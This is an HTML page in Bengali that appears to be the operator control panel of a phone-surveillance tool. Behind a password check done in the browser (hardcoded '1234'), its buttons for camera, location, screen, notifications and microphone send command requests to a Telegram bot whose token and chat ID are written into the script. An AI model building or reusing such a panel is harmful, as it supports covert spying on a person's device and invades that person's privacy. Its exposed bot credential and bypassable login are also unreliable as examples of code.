<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        body { 
            background: #1a1a2e; 
            color: #ffffff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { 
            background: #16213e; 
            padding: 30px; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
            width: 90%; 
            max-width: 400px; 
            text-align: center; 
        }
        input { 
            width: 100%; 
            padding: 15px; 
            margin-bottom: 20px; 
            border: none; 
            border-radius: 10px; 
            background: #0f3460; 
            color: white; 
            box-sizing: border-box;
            text-align: center;
        }
        button { 
            width: 100%; 
            padding: 15px; 
            margin: 10px 0; 
            border: none; 
            border-radius: 10px; 
            background: #e94560; 
            color: white; 
            font-size: 16px; 
            cursor: pointer; 
            transition: 0.3s; 
        }
        button:hover { background: #ff2e63; }
        .menu { display: none; }
        h2 { margin-bottom: 20px; color: #4ecca3; }
    </style>
</head>
<body>

    <div class="container">
        <!-- পাসওয়ার্ড সেকশন -->
        <div id="login-section">
            <h2>লগইন করুন</h2>
            <input type="password" id="pass" placeholder="Tamim0186#@">
            <button onclick="checkPass()">প্রবেশ করুন</button>
        </div>

        <!-- মেনু সেকশন -->
        <div id="main-menu" class="menu">
            <h2>কন্ট্রোল প্যানেল</h2>
            <button onclick="sendData('ক্যামেরা')">📷 ক্যামেরা</button>
            <button onclick="sendData('লোকেশন')">📍 লোকেশন</button>
            <button onclick="sendData('স্ক্রিন')">📱 মোবাইল স্ক্রিন</button>
            <button onclick="sendData('নোটিফিকেশন')">🔔 নোটিফিকেশন</button>
            <button onclick="sendData('মাইক্রোফোন')">🎤 মাইক্রোফোন</button>
        </div>
    </div>

    <script>
        function checkPass() {
            if(document.getElementById('pass').value == "1234") {
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('main-menu').style.display = 'block';
            } else { alert("ভুল পাসওয়ার্ড!"); }
        }

        function sendData(type) {
            const token = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
            const chatId = "8566985497";
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=অনুরোধ: ${type}`);
            alert(type + " পাঠানো হয়েছে!");
        }
    </script>
</body>
</html>
